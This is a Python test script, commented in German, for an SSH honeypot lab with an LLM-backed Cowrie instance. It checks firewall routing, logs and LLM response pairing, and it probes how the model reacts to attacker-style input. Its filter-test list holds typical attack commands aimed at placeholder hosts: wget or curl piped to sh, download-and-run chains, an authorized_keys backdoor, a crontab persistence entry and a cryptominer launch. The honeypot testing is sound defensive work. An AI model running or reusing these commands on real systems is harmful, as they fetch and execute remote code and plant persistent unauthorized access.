#!/usr/bin/env python3
"""Prüfskript für cowrie-b auf dem Sensor (Schritt 7.3, E-044).

Läuft auf dem Sensor, von Tom im eigenen Terminal gestartet:

    sudo python3 /opt/honeypot-lab/sensor/scripts/check-cowrie-b.py

Prüft:

1. Zuteilung: nftables leitet Port 22 weiter nur an cowrie-a, und 2322 nimmt
   nur umgeleitete oder lokale Verbindungen an. Seit dem Start von cowrie-b
   gab es dort keine Sitzung von fremden Adressen.
2. Testsitzungen von 127.0.0.1 gegen cowrie-b (mit sshdrive.py aus dem Image):
   Exec, zwei parallele Exec-Kanäle auf einer Verbindung, Exec mit EOF und
   eine interaktive Sitzung mit leerer Zeile.
3. Im Log von B: Zu jedem cowrie.command.input genau ein cowrie.llm.response
   mit passendem command_index und input_sha256, die motd wie in der Persona.

Ausgegeben werden nur Zähler und OK/FEHLER, nie Logzeilen, Befehle oder
Antworten des Modells (method.md 9.7). Exit-Code 0 heißt alles OK.

Mit ``--erwarte unavailable`` (Gateway aus) oder ``--erwarte rate_limited``
(LLM_CALLS_PER_MINUTE=1) prüft es stattdessen, dass mindestens ein Aufruf
diesen Ausgang hat (method.md V3).

Mit ``--filtertest`` (E-045) schickt es stattdessen neun eigene, harmlose
Befehle, wie Angreifer sie schicken (Downloader, SSH-Key, Persistenz, Miner),
nur mit Dokumentationsadressen (RFC 5737) und example.com. Ausgegeben werden
je Befehl ein Kurzname, Ausgang, HTTP-Status, Antwortzeit, Länge und die
ersten 200 Zeichen der Antwort (gesäubert, entschärft), dazu Zähler. Das sind
Antworten auf unsere Befehle, kein Angreifertext; Tom sieht so, ob Gemini
sperrt oder sich weigert. Die Befehle selbst stehen nur hier im Skript.

Nur Standardbibliothek.
"""

from __future__ import annotations

import argparse
import glob
import hashlib
import json
import os
import re
import statistics
import subprocess
import sys
import time
import unicodedata
from collections import Counter
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

SENSOR = Path(__file__).resolve().parents[1]
MOTD = SENSOR / "persona" / "honeyfs" / "etc" / "motd"
# Wrapper um sshdrive.py, der den Anfang der Ausgabe mitgibt (nur --filtertest).
TEXT_DRIVER = SENSOR / "scripts" / "sshdrive_text.py"
LOG_DIR = "/srv/honeypot/b/var/log/cowrie"
LOCAL = {"127.0.0.1", "::1"}
PORT_A = 2222
PORT_B = 2322

# Die Testsitzungen. Sieben Aufrufe, unter Cowries Begrenzung von 20 je
# Minute und Adresse. Die Befehle sind harmlos und stehen nur hier.
PLAN: list[dict[str, Any]] = [
    {"name": "exec", "exec": ["uname -a"]},
    {"name": "parallel", "exec": ["uname -a", "id"]},
    {"name": "exec-eof", "exec": ["hostname"], "eof": True},
    {"name": "interaktiv", "shell": ["uname -a", "", "id"]},
]

ANSI = re.compile(rb"\x1b\[[0-9;?]*[A-Za-z]")

# --filtertest (E-045): typische Befehle von Angreifern, harmlos gemacht durch
# die Ziele. Nur RFC-5737-Adressen und example.com, ein erfundener Public Key.
# Neun Befehle, unter Cowries Begrenzung von 20 je Minute und Adresse.
DUMMY_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleDummyKeyForLabProbesOnly0000000000 probe@example.com"
FILTER_PLAN: list[tuple[str, str]] = [
    ("uname", "uname -a"),
    ("whoami", "whoami"),
    ("ssh-key", f'mkdir -p ~/.ssh && echo "{DUMMY_KEY}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'),
    ("wget", "wget http://192.0.2.10/bins/x86_64 -O /tmp/.x"),
    ("curl-sh", "curl -fsSL https://example.com/install.sh | sh"),
    ("laden-starten", "cd /tmp && wget -q http://198.51.100.20/a.sh && chmod +x a.sh && ./a.sh"),
    ("chmod-start", "chmod +x /tmp/.x && /tmp/.x"),
    ("crontab", '(crontab -l 2>/dev/null; echo "* * * * * curl -fsSL https://example.com/u.sh | sh") | crontab -'),
    ("miner", "/tmp/.x -o stratum+tcp://pool.example.com:3333 -u example -p x --donate-level 1 -B"),
]
PREVIEW_CHARS = 200


# --- nftables -----------------------------------------------------------------


def _match(expr: dict[str, Any]) -> tuple[str, Any] | None:
    """Ein Vergleich als (Was, Wert), etwa ("dport", 22) oder ("iif", "lo")."""
    match = expr.get("match")
    if not isinstance(match, dict):
        return None
    left, right = match.get("left") or {}, match.get("right")
    if isinstance(right, list) and len(right) == 1:
        right = right[0]
    if "payload" in left and left["payload"].get("field") == "dport":
        return ("dport", right)
    if "meta" in left:
        return (left["meta"].get("key"), right)
    if "ct" in left:
        return ("ct " + str(left["ct"].get("key")), right)
    return ("?", right)


def rules_of(ruleset: dict[str, Any]) -> list[dict[str, Any]]:
    """Die Regeln der Tabelle ``ip honeypot`` in vereinfachter Form."""
    rules = []
    for item in ruleset.get("nftables", []):
        rule = item.get("rule")
        if not rule or rule.get("table") != "honeypot" or rule.get("family") != "ip":
            continue
        simple: dict[str, Any] = {"chain": rule.get("chain"), "match": {}, "verdict": None, "redirect": None}
        for expr in rule.get("expr", []):
            found = _match(expr)
            if found:
                simple["match"][found[0]] = found[1]
            elif "redirect" in expr:
                simple["redirect"] = (expr["redirect"] or {}).get("port")
            elif "accept" in expr:
                simple["verdict"] = "accept"
            elif "drop" in expr:
                simple["verdict"] = "drop"
        rules.append(simple)
    return rules


def check_nft(ruleset: dict[str, Any]) -> list[tuple[str, bool]]:
    rules = rules_of(ruleset)
    redirects = [(r["match"].get("dport"), r["redirect"]) for r in rules if r["redirect"] is not None]
    guard = [
        (r["match"], r["verdict"])
        for r in rules
        if r["chain"] == "input" and r["match"].get("dport") == PORT_B
    ]
    expected_guard = [
        ({"dport": PORT_B, "iif": "lo"}, "accept"),
        ({"dport": PORT_B, "ct status": "dnat"}, "accept"),
        ({"dport": PORT_B}, "drop"),
    ]
    return [
        ("Zuteilung: Port 22 nur an cowrie-a (2222)", redirects == [(22, PORT_A)]),
        ("Zuteilung: keine Umleitung auf cowrie-b (2322)", all(port != PORT_B for _, port in redirects)),
        ("nftables: 2322 nur von lo oder nach Umleitung, sonst verworfen", guard == expected_guard),
    ]


# --- Log von B ------------------------------------------------------------------


def parse_time(value: str) -> datetime:
    """Cowrie (Mikrosekunden, Z) und Docker (Nanosekunden, Z) in UTC."""
    match = re.match(r"(\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d)(?:\.(\d+))?", value)
    if not match:
        raise ValueError("Zeitstempel nicht lesbar")
    fraction = (match.group(2) or "0")[:6].ljust(6, "0")
    return datetime.fromisoformat(f"{match.group(1)}.{fraction}+00:00")


def sessions_since(events: list[dict[str, Any]], since: datetime) -> dict[str, list[dict[str, Any]]]:
    """Ereignisse je Sitzung in Logreihenfolge: nur eigene Sitzungen von
    Loopback mit Login, die ab ``since`` begonnen haben. Ohne Login ist es
    keine Testsitzung, etwa ein Portscan von lo."""
    started: set[str] = set()
    logged_in: set[str] = set()
    grouped: dict[str, list[dict[str, Any]]] = {}
    for event in events:
        session = event.get("session")
        if not isinstance(session, str):
            continue
        if (
            event.get("eventid") == "cowrie.session.connect"
            and event.get("src_ip") in LOCAL
            and parse_time(event["timestamp"]) >= since
        ):
            started.add(session)
        if event.get("eventid") == "cowrie.login.success":
            logged_in.add(session)
        grouped.setdefault(session, []).append(event)
    return {s: e for s, e in grouped.items() if s in started and s in logged_in}


def foreign_sessions(events: list[dict[str, Any]], since: datetime) -> int:
    return sum(
        1
        for e in events
        if e.get("eventid") == "cowrie.session.connect"
        and e.get("src_ip") not in LOCAL
        and parse_time(e["timestamp"]) >= since
    )


def pairing(session_events: list[dict[str, Any]]) -> dict[str, Any]:
    """Befehle und Aufrufe einer Sitzung, nur als Zähler und Ja/Nein."""
    inputs = [e for e in session_events if e.get("eventid") == "cowrie.command.input"]
    responses = [e for e in session_events if e.get("eventid") == "cowrie.llm.response"]
    hashes = [hashlib.sha256(str(e.get("input", "")).encode("utf-8", "surrogatepass")).hexdigest() for e in inputs]
    by_index = {r.get("command_index"): r for r in responses}
    indices_ok = sorted(by_index) == list(range(1, len(inputs) + 1)) and len(by_index) == len(responses)
    hashes_ok = indices_ok and all(by_index[i + 1].get("input_sha256") == h for i, h in enumerate(hashes))
    # Jeder Aufruf steht nach seinem Befehl im Log.
    order_ok = indices_ok and all(
        session_events.index(by_index[i + 1]) > session_events.index(inp) for i, inp in enumerate(inputs)
    )
    return {
        "befehle": len(inputs),
        "aufrufe": len(responses),
        "index_ok": indices_ok,
        "hash_ok": hashes_ok,
        "reihenfolge_ok": order_ok,
        "interaktiv": any(e.get("eventid") == "cowrie.client.size" for e in session_events),
        "outcomes": Counter(str(r.get("outcome")) for r in responses),
        "client_gone": sum(1 for r in responses if r.get("client_gone") is True),
    }


def expected_counts(plan: list[dict[str, Any]]) -> tuple[int, int, int]:
    """Sitzungen, davon interaktiv, und Befehle laut Plan."""
    sessions = len(plan)
    interactive = sum(1 for step in plan if "shell" in step)
    commands = sum(len(step.get("exec", [])) + len(step.get("shell", [])) for step in plan)
    return sessions, interactive, commands


def check_log(
    sessions: dict[str, list[dict[str, Any]]], plan: list[dict[str, Any]], expect: str | None
) -> tuple[list[tuple[str, bool]], dict[str, Any]]:
    want_sessions, want_interactive, want_commands = expected_counts(plan)
    results = [pairing(events) for events in sessions.values()]
    outcomes: Counter[str] = Counter()
    for result in results:
        outcomes.update(result["outcomes"])
    counts = {
        "sitzungen": len(results),
        "interaktiv": sum(1 for r in results if r["interaktiv"]),
        "befehle": sum(r["befehle"] for r in results),
        "aufrufe": sum(r["aufrufe"] for r in results),
        "client_gone": sum(r["client_gone"] for r in results),
        "outcomes": dict(sorted(outcomes.items())),
    }
    checks = [
        (f"Testsitzungen im Log von B: {counts['sitzungen']} von {want_sessions}", counts["sitzungen"] == want_sessions),
        (
            f"davon interaktiv (mit client.size): {counts['interaktiv']} von {want_interactive}",
            counts["interaktiv"] == want_interactive,
        ),
        (f"command.input: {counts['befehle']} von {want_commands}", counts["befehle"] == want_commands),
        (f"llm.response: {counts['aufrufe']}, je Befehl genau eines", counts["aufrufe"] == counts["befehle"]),
        ("command_index je Sitzung lückenlos 1..n", all(r["index_ok"] for r in results) and bool(results)),
        ("input_sha256 passt zum command.input am selben Index", all(r["hash_ok"] for r in results) and bool(results)),
        ("jedes llm.response steht nach seinem command.input", all(r["reihenfolge_ok"] for r in results) and bool(results)),
        (f"client_gone: {counts['client_gone']} (erwartet 0)", counts["client_gone"] == 0),
    ]
    summary = ", ".join(f"{k} {v}" for k, v in counts["outcomes"].items()) or "keine"
    if expect:
        checks.append((f"Outcomes: {summary}; erwartet mindestens ein {expect}", outcomes.get(expect, 0) > 0))
    else:
        checks.append((f"Outcomes: {summary}; erwartet alle ok", bool(outcomes) and set(outcomes) == {"ok"}))
    return checks, counts


def motd_digest(raw: bytes) -> str:
    """Wie sshdrive.py: ohne Steuerfolgen, Zeilenenden als \\n."""
    return hashlib.sha256(ANSI.sub(b"", raw).replace(b"\r\n", b"\n")).hexdigest()


def check_drive(results: list[dict[str, Any]], plan: list[dict[str, Any]], expect: str | None) -> list[tuple[str, bool]]:
    shell = [r for r in results if "motd_sha256" in r]
    channels = [k for r in results for k in r.get("kanaele", [])]
    checks = [
        (
            f"Verbindungen: {sum(1 for r in results if r.get('verbunden'))} von {len(plan)}, "
            f"fertig: {sum(1 for r in results if r.get('fertig'))}",
            len(results) == len(plan) and all(r.get("verbunden") and r.get("fertig") for r in results),
        ),
        (
            "motd in B wie persona/honeyfs/etc/motd",
            len(shell) == 1 and shell[0]["motd_sha256"] == motd_digest(MOTD.read_bytes()),
        ),
    ]
    if not expect:
        with_output = sum(1 for k in channels if k.get("bytes", 0) > 0)
        checks.append(
            (
                f"Ausgabe beim Client: {with_output} von {len(channels)} Kanälen, auch mit EOF",
                with_output == len(channels),
            )
        )
    return checks


# --- Ablauf auf dem Sensor ----------------------------------------------------------


def run(command: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
    return subprocess.run(command, check=True, capture_output=True, text=True, **kwargs)


def container(name: str) -> dict[str, Any]:
    out = run(["docker", "inspect", "-f", "{{json .}}", name]).stdout
    return json.loads(out)


def drive(image: str, plan: list[dict[str, Any]], with_text: bool = False) -> list[dict[str, Any]]:
    """Startet sshdrive.py aus dem Image; mit ``with_text`` den Wrapper aus
    diesem Repo, read-only eingehängt (E-045)."""
    mount: list[str] = []
    script = "/cowrie/lab/sshdrive.py"
    if with_text:
        mount = ["-v", f"{TEXT_DRIVER}:/lab-tools/sshdrive_text.py:ro"]
        script = "/lab-tools/sshdrive_text.py"
    out = run(
        [
            "docker", "run", "--rm", "-i", "--network", "host",
            "--read-only", "--tmpfs", "/tmp", "--cap-drop", "ALL",
            "--security-opt", "no-new-privileges", "--user", "999:999",
            *mount,
            "--entrypoint", "/cowrie/cowrie-env/bin/python3",
            image, script, "--host", "127.0.0.1", "--port", str(PORT_B),
        ],
        input=json.dumps(plan),
        timeout=600,
    ).stdout
    return json.loads(out)


def read_events(directory: str) -> list[dict[str, Any]]:
    events = []
    # Erst die rotierten, dann die aktuelle Datei: Logreihenfolge.
    paths = sorted(glob.glob(os.path.join(directory, "cowrie.json.*"))) + [os.path.join(directory, "cowrie.json")]
    for path in paths:
        if not os.path.exists(path):
            continue
        with open(path, encoding="utf-8", errors="replace") as handle:
            for line in handle:
                try:
                    events.append(json.loads(line))
                except ValueError:
                    continue
    return events


# --- Filtertest (E-045) ----------------------------------------------------------

# Wie server/app/defang.py: URLs und IPv4-Adressen unklickbar (AGENTS.md).
SCHEMES = {"http": "hxxp", "https": "hxxps", "ftp": "fxp", "tftp": "tfxp"}
URL = re.compile(r"\b(?P<scheme>https?|ftp|tftp)://(?P<rest>[^\s\"'<>\\|)]*)", re.IGNORECASE)
IPV4 = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")


def defang(text: str) -> str:
    def url(match: re.Match[str]) -> str:
        authority, separator, path = match.group("rest").partition("/")
        scheme = match.group("scheme").lower()
        return f"{SCHEMES.get(scheme, scheme)}://{authority.replace('.', '[.]')}{separator}{path}"

    text = URL.sub(url, text)
    return IPV4.sub(lambda m: m.group(0).replace(".", "[.]"), text)


def preview(text: str, limit: int = PREVIEW_CHARS) -> str:
    """Die ersten ``limit`` Zeichen als eine Zeile: Zeilenumbrüche als ⏎,
    Steuer- und Formatzeichen (auch Bidi-Steuerung) entfernt, entschärft."""
    short = text[:limit].replace("\r\n", "\n")
    chars = []
    for char in short:
        category = unicodedata.category(char)
        if char == "\n" or category in ("Zl", "Zp"):
            chars.append(" ⏎ ")
        elif char == "\t":
            chars.append(" ")
        elif category not in ("Cc", "Cf", "Cs", "Co", "Cn"):
            chars.append(char)
    cleaned = defang("".join(chars))
    return cleaned + (" …" if len(text) > limit else "")


def filter_steps(plan: list[tuple[str, str]]) -> list[dict[str, Any]]:
    """Je Befehl eine eigene Verbindung, wie ein Bot."""
    return [{"name": name, "exec": [command]} for name, command in plan]


def filter_rows(
    sessions: dict[str, list[dict[str, Any]]], plan: list[tuple[str, str]], results: list[dict[str, Any]]
) -> list[dict[str, Any]]:
    """Je Befehl: Aufruf aus dem Log (über input_sha256) und Text vom Client."""
    by_hash: dict[str, list[dict[str, Any]]] = {}
    for events in sessions.values():
        for event in events:
            if event.get("eventid") == "cowrie.llm.response":
                by_hash.setdefault(str(event.get("input_sha256")), []).append(event)
    texts = {r.get("name"): ((r.get("kanaele") or [{}])[0]).get("text", "") for r in results}
    rows = []
    for name, command in plan:
        found = by_hash.get(hashlib.sha256(command.encode("utf-8")).hexdigest(), [])
        call = found[0] if len(found) == 1 else {}
        rows.append(
            {
                "name": name,
                "aufrufe": len(found),
                "outcome": call.get("outcome"),
                "http_status": call.get("http_status"),
                "latency_ms": call.get("latency_ms"),
                "output_chars": call.get("output_chars"),
                "text": texts.get(name) or "",
            }
        )
    return rows


def _spread(values: list[int]) -> str:
    return f"Median {int(statistics.median(values))}, Max {max(values)}" if values else "keine"


def filter_report(rows: list[dict[str, Any]]) -> tuple[list[str], list[tuple[str, bool]]]:
    """Zeilen für das Terminal und die eine Prüfung: je Befehl genau ein Aufruf."""
    lines = [f"Filtertest: {len(rows)} eigene Befehle gegen cowrie-b (nur RFC 5737 und example.com)"]
    for row in rows:
        latency = row["latency_ms"] if isinstance(row["latency_ms"], int) else "-"
        chars = row["output_chars"] if isinstance(row["output_chars"], int) else "-"
        lines.append(
            f"{row['name']:<14} {str(row['outcome']):<16} {str(row['http_status'] or '-'):>4} "
            f"{latency:>6} ms {chars:>6} Zeichen | {preview(row['text'])}"
        )
    ok = [r for r in rows if r["outcome"] == "ok"]
    outcomes = Counter(str(r["outcome"]) for r in rows)
    statuses = Counter(str(r["http_status"] or "-") for r in rows)
    lines += [
        "Outcomes: " + ", ".join(f"{k} {v}" for k, v in sorted(outcomes.items())),
        "HTTP: " + ", ".join(f"{k} {v}" for k, v in sorted(statuses.items())),
        f"ok mit 0 Zeichen: {sum(1 for r in ok if r['output_chars'] == 0)}",
        "latency_ms (ok): " + _spread([r["latency_ms"] for r in ok if isinstance(r["latency_ms"], int)]),
        "output_chars (ok): " + _spread([r["output_chars"] for r in ok if isinstance(r["output_chars"], int)]),
        "Hinweis: upstream_error (502) kann eine Sperre bei Gemini sein. Getrennt zählt sie auf dem",
        "  Hauptserver: python -m app.llm_check --tage 1, unter gateway.status.upstream_blocked;",
        "  Weigerungen unter gateway.weigerungen.",
    ]
    checks = [("je Befehl genau ein llm.response", bool(rows) and all(r["aufrufe"] == 1 for r in rows))]
    return lines, checks


def report(checks: list[tuple[str, bool]]) -> bool:
    for text, ok in checks:
        print(f"{'OK    ' if ok else 'FEHLER'} {text}")
    return all(ok for _, ok in checks)


def main(argv: list[str]) -> int:
    parser = argparse.ArgumentParser(description="Prüft cowrie-b auf dem Sensor (Schritt 7.3).")
    parser.add_argument("--erwarte", choices=["unavailable", "rate_limited"], default=None)
    parser.add_argument("--nft-json", help="nur die nftables-Prüfung, aus einer Datei (Tests)")
    parser.add_argument("--filtertest", action="store_true", help="eigene Testbefehle, Antworten gekürzt (E-045)")
    args = parser.parse_args(argv)

    if args.nft_json:
        with open(args.nft_json, encoding="utf-8") as handle:
            return 0 if report(check_nft(json.load(handle))) else 1

    if os.geteuid() != 0:
        print("Bitte mit sudo ausführen.", file=sys.stderr)
        return 2

    if args.filtertest:
        return filtertest()

    checks: list[tuple[str, bool]] = []
    b = container("cowrie-b")
    a = container("cowrie-a")
    checks.append(("cowrie-a läuft", a["State"]["Running"]))
    checks.append(("cowrie-b läuft", b["State"]["Running"]))
    checks += check_nft(json.loads(run(["nft", "-j", "list", "table", "ip", "honeypot"]).stdout))

    foreign = foreign_sessions(read_events(LOG_DIR), parse_time(b["State"]["StartedAt"]))
    checks.append((f"Sitzungen in B von fremden Adressen seit dem Start: {foreign}", foreign == 0))

    start = datetime.now(tz=timezone.utc)
    results = drive(b["Config"]["Image"], PLAN)
    checks += check_drive(results, PLAN, args.erwarte)

    # Cowrie schreibt sofort, Vector liest nur. Kurz warten genügt.
    time.sleep(2)
    log_checks, _ = check_log(sessions_since(read_events(LOG_DIR), start), PLAN, args.erwarte)
    checks += log_checks
    ok = report(checks)
    print("Ergebnis:", "OK" if ok else "FEHLER")
    return 0 if ok else 1


def filtertest() -> int:
    b = container("cowrie-b")
    if not b["State"]["Running"]:
        print("FEHLER cowrie-b läuft nicht")
        return 1
    start = datetime.now(tz=timezone.utc)
    results = drive(b["Config"]["Image"], filter_steps(FILTER_PLAN), with_text=True)
    time.sleep(2)
    rows = filter_rows(sessions_since(read_events(LOG_DIR), start), FILTER_PLAN, results)
    lines, checks = filter_report(rows)
    print("\n".join(lines))
    connected = all(r.get("verbunden") and r.get("fertig") for r in results) and len(results) == len(FILTER_PLAN)
    ok = report([(f"Verbindungen: {len(results)} von {len(FILTER_PLAN)}, alle fertig", connected), *checks])
    print("Ergebnis:", "OK" if ok else "FEHLER")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
